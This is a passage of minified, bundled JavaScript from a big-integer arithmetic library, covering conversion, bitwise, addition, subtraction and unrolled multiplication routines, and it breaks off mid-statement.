              for (var e = 0; e < this.length; e++) t.words[e] = this.words[e];
              (t.length = this.length),
                (t.negative = this.negative),
                (t.red = this.red);
            }),
            (o.prototype._move = function (t) {
              c(t, this);
            }),
            (o.prototype.clone = function () {
              var t = new o(null);
              return this.copy(t), t;
            }),
            (o.prototype._expand = function (t) {
              for (; this.length < t; ) this.words[this.length++] = 0;
              return this;
            }),
            (o.prototype._strip = function () {
              for (; this.length > 1 && 0 === this.words[this.length - 1]; )
                this.length--;
              return this._normSign();
            }),
            (o.prototype._normSign = function () {
              return (
                1 === this.length && 0 === this.words[0] && (this.negative = 0),
                this
              );
            }),
            "undefined" != typeof Symbol && "function" == typeof Symbol.for)
          )
            try {
              o.prototype[Symbol.for("nodejs.util.inspect.custom")] = l;
            } catch (T) {
              o.prototype.inspect = l;
            }
          else o.prototype.inspect = l;
          function l() {
            return (this.red ? "<BN-R: " : "<BN: ") + this.toString(16) + ">";
          }
          var d = [
              "",
              "0",
              "00",
              "000",
              "0000",
              "00000",
              "000000",
              "0000000",
              "00000000",
              "000000000",
              "0000000000",
              "00000000000",
              "000000000000",
              "0000000000000",
              "00000000000000",
              "000000000000000",
              "0000000000000000",
              "00000000000000000",
              "000000000000000000",
              "0000000000000000000",
              "00000000000000000000",
              "000000000000000000000",
              "0000000000000000000000",
              "00000000000000000000000",
              "000000000000000000000000",
              "0000000000000000000000000",
            ],
            f = [
              0, 0, 25, 16, 12, 11, 10, 9, 8, 8, 7, 7, 7, 7, 6, 6, 6, 6, 6, 6,
              6, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5, 5,
            ],
            h = [
              0, 0, 33554432, 43046721, 16777216, 48828125, 60466176, 40353607,
              16777216, 43046721, 1e7, 19487171, 35831808, 62748517, 7529536,
              11390625, 16777216, 24137569, 34012224, 47045881, 64e6, 4084101,
              5153632, 6436343, 7962624, 9765625, 11881376, 14348907, 17210368,
              20511149, 243e5, 28629151, 33554432, 39135393, 45435424, 52521875,
              60466176,
            ];
          function p(t, e, n) {
            n.negative = e.negative ^ t.negative;
            var r = (t.length + e.length) | 0;
            (n.length = r), (r = (r - 1) | 0);
            var o = 0 | t.words[0],
              i = 0 | e.words[0],
              s = o * i,
              a = 67108863 & s,
              u = (s / 67108864) | 0;
            n.words[0] = a;
            for (var c = 1; c < r; c++) {
              for (
                var l = u >>> 26,
                  d = 67108863 & u,
                  f = Math.min(c, e.length - 1),
                  h = Math.max(0, c - t.length + 1);
                h <= f;
                h++
              ) {
                var p = (c - h) | 0;
                (l +=
                  ((s = (o = 0 | t.words[p]) * (i = 0 | e.words[h]) + d) /
                    67108864) |
                  0),
                  (d = 67108863 & s);
              }
              (n.words[c] = 0 | d), (u = 0 | l);
            }
            return 0 !== u ? (n.words[c] = 0 | u) : n.length--, n._strip();
          }
          (o.prototype.toString = function (t, e) {
            var r;
            if (((e = 0 | e || 1), 16 === (t = t || 10) || "hex" === t)) {
              r = "";
              for (var o = 0, i = 0, s = 0; s < this.length; s++) {
                var a = this.words[s],
                  u = (16777215 & ((a << o) | i)).toString(16);
                (i = (a >>> (24 - o)) & 16777215),
                  (o += 2) >= 26 && ((o -= 26), s--),
                  (r =
                    0 !== i || s !== this.length - 1
                      ? d[6 - u.length] + u + r
                      : u + r);
              }
              for (0 !== i && (r = i.toString(16) + r); r.length % e !== 0; )
                r = "0" + r;
              return 0 !== this.negative && (r = "-" + r), r;
            }
            if (t === (0 | t) && t >= 2 && t <= 36) {
              var c = f[t],
                l = h[t];
              r = "";
              var p = this.clone();
              for (p.negative = 0; !p.isZero(); ) {
                var m = p.modrn(l).toString(t);
                r = (p = p.idivn(l)).isZero() ? m + r : d[c - m.length] + m + r;
              }
              for (this.isZero() && (r = "0" + r); r.length % e !== 0; )
                r = "0" + r;
              return 0 !== this.negative && (r = "-" + r), r;
            }
            n(!1, "Base should be between 2 and 36");
          }),
            (o.prototype.toNumber = function () {
              var t = this.words[0];
              return (
                2 === this.length
                  ? (t += 67108864 * this.words[1])
                  : 3 === this.length && 1 === this.words[2]
                  ? (t += 4503599627370496 + 67108864 * this.words[1])
                  : this.length > 2 &&
                    n(!1, "Number can only safely store up to 53 bits"),
                0 !== this.negative ? -t : t
              );
            }),
            (o.prototype.toJSON = function () {
              return this.toString(16, 2);
            }),
            i &&
              (o.prototype.toBuffer = function (t, e) {
                return this.toArrayLike(i, t, e);
              }),
            (o.prototype.toArray = function (t, e) {
              return this.toArrayLike(Array, t, e);
            }),
            (o.prototype.toArrayLike = function (t, e, r) {
              this._strip();
              var o = this.byteLength(),
                i = r || Math.max(1, o);
              n(o <= i, "byte array longer than desired length"),
                n(i > 0, "Requested array length <= 0");
              var s = (function (t, e) {
                return t.allocUnsafe ? t.allocUnsafe(e) : new t(e);
              })(t, i);
              return this["_toArrayLike" + ("le" === e ? "LE" : "BE")](s, o), s;
            }),
            (o.prototype._toArrayLikeLE = function (t, e) {
              for (var n = 0, r = 0, o = 0, i = 0; o < this.length; o++) {
                var s = (this.words[o] << i) | r;
                (t[n++] = 255 & s),
                  n < t.length && (t[n++] = (s >> 8) & 255),
                  n < t.length && (t[n++] = (s >> 16) & 255),
                  6 === i
                    ? (n < t.length && (t[n++] = (s >> 24) & 255),
                      (r = 0),
                      (i = 0))
                    : ((r = s >>> 24), (i += 2));
              }
              if (n < t.length) for (t[n++] = r; n < t.length; ) t[n++] = 0;
            }),
            (o.prototype._toArrayLikeBE = function (t, e) {
              for (
                var n = t.length - 1, r = 0, o = 0, i = 0;
                o < this.length;
                o++
              ) {
                var s = (this.words[o] << i) | r;
                (t[n--] = 255 & s),
                  n >= 0 && (t[n--] = (s >> 8) & 255),
                  n >= 0 && (t[n--] = (s >> 16) & 255),
                  6 === i
                    ? (n >= 0 && (t[n--] = (s >> 24) & 255), (r = 0), (i = 0))
                    : ((r = s >>> 24), (i += 2));
              }
              if (n >= 0) for (t[n--] = r; n >= 0; ) t[n--] = 0;
            }),
            Math.clz32
              ? (o.prototype._countBits = function (t) {
                  return 32 - Math.clz32(t);
                })
              : (o.prototype._countBits = function (t) {
                  var e = t,
                    n = 0;
                  return (
                    e >= 4096 && ((n += 13), (e >>>= 13)),
                    e >= 64 && ((n += 7), (e >>>= 7)),
                    e >= 8 && ((n += 4), (e >>>= 4)),
                    e >= 2 && ((n += 2), (e >>>= 2)),
                    n + e
                  );
                }),
            (o.prototype._zeroBits = function (t) {
              if (0 === t) return 26;
              var e = t,
                n = 0;
              return (
                8191 & e || ((n += 13), (e >>>= 13)),
                127 & e || ((n += 7), (e >>>= 7)),
                15 & e || ((n += 4), (e >>>= 4)),
                3 & e || ((n += 2), (e >>>= 2)),
                1 & e || n++,
                n
              );
            }),
            (o.prototype.bitLength = function () {
              var t = this.words[this.length - 1],
                e = this._countBits(t);
              return 26 * (this.length - 1) + e;
            }),
            (o.prototype.zeroBits = function () {
              if (this.isZero()) return 0;
              for (var t = 0, e = 0; e < this.length; e++) {
                var n = this._zeroBits(this.words[e]);
                if (((t += n), 26 !== n)) break;
              }
              return t;
            }),
            (o.prototype.byteLength = function () {
              return Math.ceil(this.bitLength() / 8);
            }),
            (o.prototype.toTwos = function (t) {
              return 0 !== this.negative
                ? this.abs().inotn(t).iaddn(1)
                : this.clone();
            }),
            (o.prototype.fromTwos = function (t) {
              return this.testn(t - 1)
                ? this.notn(t).iaddn(1).ineg()
                : this.clone();
            }),
            (o.prototype.isNeg = function () {
              return 0 !== this.negative;
            }),
            (o.prototype.neg = function () {
              return this.clone().ineg();
            }),
            (o.prototype.ineg = function () {
              return this.isZero() || (this.negative ^= 1), this;
            }),
            (o.prototype.iuor = function (t) {
              for (; this.length < t.length; ) this.words[this.length++] = 0;
              for (var e = 0; e < t.length; e++)
                this.words[e] = this.words[e] | t.words[e];
              return this._strip();
            }),
            (o.prototype.ior = function (t) {
              return n(0 === (this.negative | t.negative)), this.iuor(t);
            }),
            (o.prototype.or = function (t) {
              return this.length > t.length
                ? this.clone().ior(t)
                : t.clone().ior(this);
            }),
            (o.prototype.uor = function (t) {
              return this.length > t.length
                ? this.clone().iuor(t)
                : t.clone().iuor(this);
            }),
            (o.prototype.iuand = function (t) {
              var e;
              e = this.length > t.length ? t : this;
              for (var n = 0; n < e.length; n++)
                this.words[n] = this.words[n] & t.words[n];
              return (this.length = e.length), this._strip();
            }),
            (o.prototype.iand = function (t) {
              return n(0 === (this.negative | t.negative)), this.iuand(t);
            }),
            (o.prototype.and = function (t) {
              return this.length > t.length
                ? this.clone().iand(t)
                : t.clone().iand(this);
            }),
            (o.prototype.uand = function (t) {
              return this.length > t.length
                ? this.clone().iuand(t)
                : t.clone().iuand(this);
            }),
            (o.prototype.iuxor = function (t) {
              var e, n;
              this.length > t.length
                ? ((e = this), (n = t))
                : ((e = t), (n = this));
              for (var r = 0; r < n.length; r++)
                this.words[r] = e.words[r] ^ n.words[r];
              if (this !== e)
                for (; r < e.length; r++) this.words[r] = e.words[r];
              return (this.length = e.length), this._strip();
            }),
            (o.prototype.ixor = function (t) {
              return n(0 === (this.negative | t.negative)), this.iuxor(t);
            }),
            (o.prototype.xor = function (t) {
              return this.length > t.length
                ? this.clone().ixor(t)
                : t.clone().ixor(this);
            }),
            (o.prototype.uxor = function (t) {
              return this.length > t.length
                ? this.clone().iuxor(t)
                : t.clone().iuxor(this);
            }),
            (o.prototype.inotn = function (t) {
              n("number" == typeof t && t >= 0);
              var e = 0 | Math.ceil(t / 26),
                r = t % 26;
              this._expand(e), r > 0 && e--;
              for (var o = 0; o < e; o++)
                this.words[o] = 67108863 & ~this.words[o];
              return (
                r > 0 &&
                  (this.words[o] = ~this.words[o] & (67108863 >> (26 - r))),
                this._strip()
              );
            }),
            (o.prototype.notn = function (t) {
              return this.clone().inotn(t);
            }),
            (o.prototype.setn = function (t, e) {
              n("number" == typeof t && t >= 0);
              var r = (t / 26) | 0,
                o = t % 26;
              return (
                this._expand(r + 1),
                (this.words[r] = e
                  ? this.words[r] | (1 << o)
                  : this.words[r] & ~(1 << o)),
                this._strip()
              );
            }),
            (o.prototype.iadd = function (t) {
              var e, n, r;
              if (0 !== this.negative && 0 === t.negative)
                return (
                  (this.negative = 0),
                  (e = this.isub(t)),
                  (this.negative ^= 1),
                  this._normSign()
                );
              if (0 === this.negative && 0 !== t.negative)
                return (
                  (t.negative = 0),
                  (e = this.isub(t)),
                  (t.negative = 1),
                  e._normSign()
                );
              this.length > t.length
                ? ((n = this), (r = t))
                : ((n = t), (r = this));
              for (var o = 0, i = 0; i < r.length; i++)
                (e = (0 | n.words[i]) + (0 | r.words[i]) + o),
                  (this.words[i] = 67108863 & e),
                  (o = e >>> 26);
              for (; 0 !== o && i < n.length; i++)
                (e = (0 | n.words[i]) + o),
                  (this.words[i] = 67108863 & e),
                  (o = e >>> 26);
              if (((this.length = n.length), 0 !== o))
                (this.words[this.length] = o), this.length++;
              else if (n !== this)
                for (; i < n.length; i++) this.words[i] = n.words[i];
              return this;
            }),
            (o.prototype.add = function (t) {
              var e;
              return 0 !== t.negative && 0 === this.negative
                ? ((t.negative = 0), (e = this.sub(t)), (t.negative ^= 1), e)
                : 0 === t.negative && 0 !== this.negative
                ? ((this.negative = 0),
                  (e = t.sub(this)),
                  (this.negative = 1),
                  e)
                : this.length > t.length
                ? this.clone().iadd(t)
                : t.clone().iadd(this);
            }),
            (o.prototype.isub = function (t) {
              if (0 !== t.negative) {
                t.negative = 0;
                var e = this.iadd(t);
                return (t.negative = 1), e._normSign();
              }
              if (0 !== this.negative)
                return (
                  (this.negative = 0),
                  this.iadd(t),
                  (this.negative = 1),
                  this._normSign()
                );
              var n,
                r,
                o = this.cmp(t);
              if (0 === o)
                return (
                  (this.negative = 0),
                  (this.length = 1),
                  (this.words[0] = 0),
                  this
                );
              o > 0 ? ((n = this), (r = t)) : ((n = t), (r = this));
              for (var i = 0, s = 0; s < r.length; s++)
                (i = (e = (0 | n.words[s]) - (0 | r.words[s]) + i) >> 26),
                  (this.words[s] = 67108863 & e);
              for (; 0 !== i && s < n.length; s++)
                (i = (e = (0 | n.words[s]) + i) >> 26),
                  (this.words[s] = 67108863 & e);
              if (0 === i && s < n.length && n !== this)
                for (; s < n.length; s++) this.words[s] = n.words[s];
              return (
                (this.length = Math.max(this.length, s)),
                n !== this && (this.negative = 1),
                this._strip()
              );
            }),
            (o.prototype.sub = function (t) {
              return this.clone().isub(t);
            });
          var m = function (t, e, n) {
            var r,
              o,
              i,
              s = t.words,
              a = e.words,
              u = n.words,
              c = 0,
              l = 0 | s[0],
              d = 8191 & l,
              f = l >>> 13,
              h = 0 | s[1],
              p = 8191 & h,
              m = h >>> 13,
              g = 0 | s[2],
              y = 8191 & g,
              w = g >>> 13,
              b = 0 | s[3],
              v = 8191 & b,
              A = b >>> 13,
              k = 0 | s[4],
              I = 8191 & k,
              S = k >>> 13,
              _ = 0 | s[5],
              T = 8191 & _,
              B = _ >>> 13,
              C = 0 | s[6],
              E = 8191 & C,
              x = C >>> 13,
              P = 0 | s[7],
              O = 8191 & P,
              R = P >>> 13,
              M = 0 | s[8],
              L = 8191 & M,
              N = M >>> 13,
              D = 0 | s[9],
              U = 8191 & D,
              q = D >>> 13,
              z = 0 | a[0],
              K = 8191 & z,
              W = z >>> 13,
              F = 0 | a[1],
              j = 8191 & F,
              G = F >>> 13,
              V = 0 | a[2],
              H = 8191 & V,
              Z = V >>> 13,
              X = 0 | a[3],
              J = 8191 & X,
              Y = X >>> 13,
              Q = 0 | a[4],
              $ = 8191 & Q,
              tt = Q >>> 13,
              et = 0 | a[5],
              nt = 8191 & et,
              rt = et >>> 13,
              ot = 0 | a[6],
              it = 8191 & ot,
              st = ot >>> 13,
              at = 0 | a[7],
              ut = 8191 & at,
              ct = at >>> 13,
              lt = 0 | a[8],
              dt = 8191 & lt,
              ft = lt >>> 13,
              ht = 0 | a[9],
              pt = 8191 & ht,
              mt = ht >>> 13;
            (n.negative = t.negative ^ e.negative), (n.length = 19);
            var gt =
              (((c + (r = Math.imul(d, K))) | 0) +
                ((8191 & (o = ((o = Math.imul(d, W)) + Math.imul(f, K)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = Math.imul(f, W)) + (o >>> 13)) | 0) + (gt >>> 26)) | 0),
              (gt &= 67108863),
              (r = Math.imul(p, K)),
              (o = ((o = Math.imul(p, W)) + Math.imul(m, K)) | 0),
              (i = Math.imul(m, W));
            var yt =
              (((c + (r = (r + Math.imul(d, j)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, G)) | 0) + Math.imul(f, j)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, G)) | 0) + (o >>> 13)) | 0) +
                (yt >>> 26)) |
              0),
              (yt &= 67108863),
              (r = Math.imul(y, K)),
              (o = ((o = Math.imul(y, W)) + Math.imul(w, K)) | 0),
              (i = Math.imul(w, W)),
              (r = (r + Math.imul(p, j)) | 0),
              (o = ((o = (o + Math.imul(p, G)) | 0) + Math.imul(m, j)) | 0),
              (i = (i + Math.imul(m, G)) | 0);
            var wt =
              (((c + (r = (r + Math.imul(d, H)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, Z)) | 0) + Math.imul(f, H)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, Z)) | 0) + (o >>> 13)) | 0) +
                (wt >>> 26)) |
              0),
              (wt &= 67108863),
              (r = Math.imul(v, K)),
              (o = ((o = Math.imul(v, W)) + Math.imul(A, K)) | 0),
              (i = Math.imul(A, W)),
              (r = (r + Math.imul(y, j)) | 0),
              (o = ((o = (o + Math.imul(y, G)) | 0) + Math.imul(w, j)) | 0),
              (i = (i + Math.imul(w, G)) | 0),
              (r = (r + Math.imul(p, H)) | 0),
              (o = ((o = (o + Math.imul(p, Z)) | 0) + Math.imul(m, H)) | 0),
              (i = (i + Math.imul(m, Z)) | 0);
            var bt =
              (((c + (r = (r + Math.imul(d, J)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, Y)) | 0) + Math.imul(f, J)) | 0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, Y)) | 0) + (o >>> 13)) | 0) +
                (bt >>> 26)) |
              0),
              (bt &= 67108863),
              (r = Math.imul(I, K)),
              (o = ((o = Math.imul(I, W)) + Math.imul(S, K)) | 0),
              (i = Math.imul(S, W)),
              (r = (r + Math.imul(v, j)) | 0),
              (o = ((o = (o + Math.imul(v, G)) | 0) + Math.imul(A, j)) | 0),
              (i = (i + Math.imul(A, G)) | 0),
              (r = (r + Math.imul(y, H)) | 0),
              (o = ((o = (o + Math.imul(y, Z)) | 0) + Math.imul(w, H)) | 0),
              (i = (i + Math.imul(w, Z)) | 0),
              (r = (r + Math.imul(p, J)) | 0),
              (o = ((o = (o + Math.imul(p, Y)) | 0) + Math.imul(m, J)) | 0),
              (i = (i + Math.imul(m, Y)) | 0);
            var vt =
              (((c + (r = (r + Math.imul(d, $)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, tt)) | 0) + Math.imul(f, $)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, tt)) | 0) + (o >>> 13)) | 0) +
                (vt >>> 26)) |
              0),
              (vt &= 67108863),
              (r = Math.imul(T, K)),
              (o = ((o = Math.imul(T, W)) + Math.imul(B, K)) | 0),
              (i = Math.imul(B, W)),
              (r = (r + Math.imul(I, j)) | 0),
              (o = ((o = (o + Math.imul(I, G)) | 0) + Math.imul(S, j)) | 0),
              (i = (i + Math.imul(S, G)) | 0),
              (r = (r + Math.imul(v, H)) | 0),
              (o = ((o = (o + Math.imul(v, Z)) | 0) + Math.imul(A, H)) | 0),
              (i = (i + Math.imul(A, Z)) | 0),
              (r = (r + Math.imul(y, J)) | 0),
              (o = ((o = (o + Math.imul(y, Y)) | 0) + Math.imul(w, J)) | 0),
              (i = (i + Math.imul(w, Y)) | 0),
              (r = (r + Math.imul(p, $)) | 0),
              (o = ((o = (o + Math.imul(p, tt)) | 0) + Math.imul(m, $)) | 0),
              (i = (i + Math.imul(m, tt)) | 0);
            var At =
              (((c + (r = (r + Math.imul(d, nt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, rt)) | 0) + Math.imul(f, nt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, rt)) | 0) + (o >>> 13)) | 0) +
                (At >>> 26)) |
              0),
              (At &= 67108863),
              (r = Math.imul(E, K)),
              (o = ((o = Math.imul(E, W)) + Math.imul(x, K)) | 0),
              (i = Math.imul(x, W)),
              (r = (r + Math.imul(T, j)) | 0),
              (o = ((o = (o + Math.imul(T, G)) | 0) + Math.imul(B, j)) | 0),
              (i = (i + Math.imul(B, G)) | 0),
              (r = (r + Math.imul(I, H)) | 0),
              (o = ((o = (o + Math.imul(I, Z)) | 0) + Math.imul(S, H)) | 0),
              (i = (i + Math.imul(S, Z)) | 0),
              (r = (r + Math.imul(v, J)) | 0),
              (o = ((o = (o + Math.imul(v, Y)) | 0) + Math.imul(A, J)) | 0),
              (i = (i + Math.imul(A, Y)) | 0),
              (r = (r + Math.imul(y, $)) | 0),
              (o = ((o = (o + Math.imul(y, tt)) | 0) + Math.imul(w, $)) | 0),
              (i = (i + Math.imul(w, tt)) | 0),
              (r = (r + Math.imul(p, nt)) | 0),
              (o = ((o = (o + Math.imul(p, rt)) | 0) + Math.imul(m, nt)) | 0),
              (i = (i + Math.imul(m, rt)) | 0);
            var kt =
              (((c + (r = (r + Math.imul(d, it)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, st)) | 0) + Math.imul(f, it)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, st)) | 0) + (o >>> 13)) | 0) +
                (kt >>> 26)) |
              0),
              (kt &= 67108863),
              (r = Math.imul(O, K)),
              (o = ((o = Math.imul(O, W)) + Math.imul(R, K)) | 0),
              (i = Math.imul(R, W)),
              (r = (r + Math.imul(E, j)) | 0),
              (o = ((o = (o + Math.imul(E, G)) | 0) + Math.imul(x, j)) | 0),
              (i = (i + Math.imul(x, G)) | 0),
              (r = (r + Math.imul(T, H)) | 0),
              (o = ((o = (o + Math.imul(T, Z)) | 0) + Math.imul(B, H)) | 0),
              (i = (i + Math.imul(B, Z)) | 0),
              (r = (r + Math.imul(I, J)) | 0),
              (o = ((o = (o + Math.imul(I, Y)) | 0) + Math.imul(S, J)) | 0),
              (i = (i + Math.imul(S, Y)) | 0),
              (r = (r + Math.imul(v, $)) | 0),
              (o = ((o = (o + Math.imul(v, tt)) | 0) + Math.imul(A, $)) | 0),
              (i = (i + Math.imul(A, tt)) | 0),
              (r = (r + Math.imul(y, nt)) | 0),
              (o = ((o = (o + Math.imul(y, rt)) | 0) + Math.imul(w, nt)) | 0),
              (i = (i + Math.imul(w, rt)) | 0),
              (r = (r + Math.imul(p, it)) | 0),
              (o = ((o = (o + Math.imul(p, st)) | 0) + Math.imul(m, it)) | 0),
              (i = (i + Math.imul(m, st)) | 0);
            var It =
              (((c + (r = (r + Math.imul(d, ut)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, ct)) | 0) + Math.imul(f, ut)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, ct)) | 0) + (o >>> 13)) | 0) +
                (It >>> 26)) |
              0),
              (It &= 67108863),
              (r = Math.imul(L, K)),
              (o = ((o = Math.imul(L, W)) + Math.imul(N, K)) | 0),
              (i = Math.imul(N, W)),
              (r = (r + Math.imul(O, j)) | 0),
              (o = ((o = (o + Math.imul(O, G)) | 0) + Math.imul(R, j)) | 0),
              (i = (i + Math.imul(R, G)) | 0),
              (r = (r + Math.imul(E, H)) | 0),
              (o = ((o = (o + Math.imul(E, Z)) | 0) + Math.imul(x, H)) | 0),
              (i = (i + Math.imul(x, Z)) | 0),
              (r = (r + Math.imul(T, J)) | 0),
              (o = ((o = (o + Math.imul(T, Y)) | 0) + Math.imul(B, J)) | 0),
              (i = (i + Math.imul(B, Y)) | 0),
              (r = (r + Math.imul(I, $)) | 0),
              (o = ((o = (o + Math.imul(I, tt)) | 0) + Math.imul(S, $)) | 0),
              (i = (i + Math.imul(S, tt)) | 0),
              (r = (r + Math.imul(v, nt)) | 0),
              (o = ((o = (o + Math.imul(v, rt)) | 0) + Math.imul(A, nt)) | 0),
              (i = (i + Math.imul(A, rt)) | 0),
              (r = (r + Math.imul(y, it)) | 0),
              (o = ((o = (o + Math.imul(y, st)) | 0) + Math.imul(w, it)) | 0),
              (i = (i + Math.imul(w, st)) | 0),
              (r = (r + Math.imul(p, ut)) | 0),
              (o = ((o = (o + Math.imul(p, ct)) | 0) + Math.imul(m, ut)) | 0),
              (i = (i + Math.imul(m, ct)) | 0);
            var St =
              (((c + (r = (r + Math.imul(d, dt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, ft)) | 0) + Math.imul(f, dt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, ft)) | 0) + (o >>> 13)) | 0) +
                (St >>> 26)) |
              0),
              (St &= 67108863),
              (r = Math.imul(U, K)),
              (o = ((o = Math.imul(U, W)) + Math.imul(q, K)) | 0),
              (i = Math.imul(q, W)),
              (r = (r + Math.imul(L, j)) | 0),
              (o = ((o = (o + Math.imul(L, G)) | 0) + Math.imul(N, j)) | 0),
              (i = (i + Math.imul(N, G)) | 0),
              (r = (r + Math.imul(O, H)) | 0),
              (o = ((o = (o + Math.imul(O, Z)) | 0) + Math.imul(R, H)) | 0),
              (i = (i + Math.imul(R, Z)) | 0),
              (r = (r + Math.imul(E, J)) | 0),
              (o = ((o = (o + Math.imul(E, Y)) | 0) + Math.imul(x, J)) | 0),
              (i = (i + Math.imul(x, Y)) | 0),
              (r = (r + Math.imul(T, $)) | 0),
              (o = ((o = (o + Math.imul(T, tt)) | 0) + Math.imul(B, $)) | 0),
              (i = (i + Math.imul(B, tt)) | 0),
              (r = (r + Math.imul(I, nt)) | 0),
              (o = ((o = (o + Math.imul(I, rt)) | 0) + Math.imul(S, nt)) | 0),
              (i = (i + Math.imul(S, rt)) | 0),
              (r = (r + Math.imul(v, it)) | 0),
              (o = ((o = (o + Math.imul(v, st)) | 0) + Math.imul(A, it)) | 0),
              (i = (i + Math.imul(A, st)) | 0),
              (r = (r + Math.imul(y, ut)) | 0),
              (o = ((o = (o + Math.imul(y, ct)) | 0) + Math.imul(w, ut)) | 0),
              (i = (i + Math.imul(w, ct)) | 0),
              (r = (r + Math.imul(p, dt)) | 0),
              (o = ((o = (o + Math.imul(p, ft)) | 0) + Math.imul(m, dt)) | 0),
              (i = (i + Math.imul(m, ft)) | 0);
            var _t =
              (((c + (r = (r + Math.imul(d, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(d, mt)) | 0) + Math.imul(f, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(f, mt)) | 0) + (o >>> 13)) | 0) +
                (_t >>> 26)) |
              0),
              (_t &= 67108863),
              (r = Math.imul(U, j)),
              (o = ((o = Math.imul(U, G)) + Math.imul(q, j)) | 0),
              (i = Math.imul(q, G)),
              (r = (r + Math.imul(L, H)) | 0),
              (o = ((o = (o + Math.imul(L, Z)) | 0) + Math.imul(N, H)) | 0),
              (i = (i + Math.imul(N, Z)) | 0),
              (r = (r + Math.imul(O, J)) | 0),
              (o = ((o = (o + Math.imul(O, Y)) | 0) + Math.imul(R, J)) | 0),
              (i = (i + Math.imul(R, Y)) | 0),
              (r = (r + Math.imul(E, $)) | 0),
              (o = ((o = (o + Math.imul(E, tt)) | 0) + Math.imul(x, $)) | 0),
              (i = (i + Math.imul(x, tt)) | 0),
              (r = (r + Math.imul(T, nt)) | 0),
              (o = ((o = (o + Math.imul(T, rt)) | 0) + Math.imul(B, nt)) | 0),
              (i = (i + Math.imul(B, rt)) | 0),
              (r = (r + Math.imul(I, it)) | 0),
              (o = ((o = (o + Math.imul(I, st)) | 0) + Math.imul(S, it)) | 0),
              (i = (i + Math.imul(S, st)) | 0),
              (r = (r + Math.imul(v, ut)) | 0),
              (o = ((o = (o + Math.imul(v, ct)) | 0) + Math.imul(A, ut)) | 0),
              (i = (i + Math.imul(A, ct)) | 0),
              (r = (r + Math.imul(y, dt)) | 0),
              (o = ((o = (o + Math.imul(y, ft)) | 0) + Math.imul(w, dt)) | 0),
              (i = (i + Math.imul(w, ft)) | 0);
            var Tt =
              (((c + (r = (r + Math.imul(p, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(p, mt)) | 0) + Math.imul(m, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(m, mt)) | 0) + (o >>> 13)) | 0) +
                (Tt >>> 26)) |
              0),
              (Tt &= 67108863),
              (r = Math.imul(U, H)),
              (o = ((o = Math.imul(U, Z)) + Math.imul(q, H)) | 0),
              (i = Math.imul(q, Z)),
              (r = (r + Math.imul(L, J)) | 0),
              (o = ((o = (o + Math.imul(L, Y)) | 0) + Math.imul(N, J)) | 0),
              (i = (i + Math.imul(N, Y)) | 0),
              (r = (r + Math.imul(O, $)) | 0),
              (o = ((o = (o + Math.imul(O, tt)) | 0) + Math.imul(R, $)) | 0),
              (i = (i + Math.imul(R, tt)) | 0),
              (r = (r + Math.imul(E, nt)) | 0),
              (o = ((o = (o + Math.imul(E, rt)) | 0) + Math.imul(x, nt)) | 0),
              (i = (i + Math.imul(x, rt)) | 0),
              (r = (r + Math.imul(T, it)) | 0),
              (o = ((o = (o + Math.imul(T, st)) | 0) + Math.imul(B, it)) | 0),
              (i = (i + Math.imul(B, st)) | 0),
              (r = (r + Math.imul(I, ut)) | 0),
              (o = ((o = (o + Math.imul(I, ct)) | 0) + Math.imul(S, ut)) | 0),
              (i = (i + Math.imul(S, ct)) | 0),
              (r = (r + Math.imul(v, dt)) | 0),
              (o = ((o = (o + Math.imul(v, ft)) | 0) + Math.imul(A, dt)) | 0),
              (i = (i + Math.imul(A, ft)) | 0);
            var Bt =
              (((c + (r = (r + Math.imul(y, pt)) | 0)) | 0) +
                ((8191 &
                  (o =
                    ((o = (o + Math.imul(y, mt)) | 0) + Math.imul(w, pt)) |
                    0)) <<
                  13)) |
              0;
            (c =
              ((((i = (i + Math.imul(w, mt)) | 0) + (o >>> 13)) | 0) +
                (Bt >>> 26)) |
              0),
              (Bt &= 67108863),
              (r = Math.imul(U, J)),
              (o = ((o = Math.imul(U, Y)) + Math.imul(q, J)) | 0),
              (i = Math.imul(q, Y)),
              (r = (r + Math.imul(L, $)) | 0),
              (o = ((o = (o + Math.imul(L, tt)) | 0) + Math.imul(N, $)) | 0),
              (i = (i + Math.imul(N, tt)) | 0),
              (r = (r + Math.imul(O, nt)) | 0),
              (o = ((o = (o + Math.imul(O, rt)) | 0) + Math.imul(R, nt)) | 0),
              (i = (i + Math.imul(R, rt)) | 0),
              (r = (r + Math.imul(E, it)) | 0),
              (o = ((o = (o + Math.imul(E, st)) | 0) + Math.imul(x, it)) | 0),
              (i = (i + Math.imul(x, st)) | 0),
              (r = (r + Math.imul(T, ut)) | 0),
              (o = ((o = (o + Math.imul(T, ct)) | 0) + Math.imul(B, ut)) | 0),
              (i = (i + Math.imul(B, ct)) | 0),
              (r = (r + Math.imul(I, dt)) | 0),
              (o = ((o = (o + Math.imul(I, ft)) | 0) + Math.imul(S, dt)) | 0),
              (i = (i + Math.imul(S, ft)) | 0);
            var Ct =
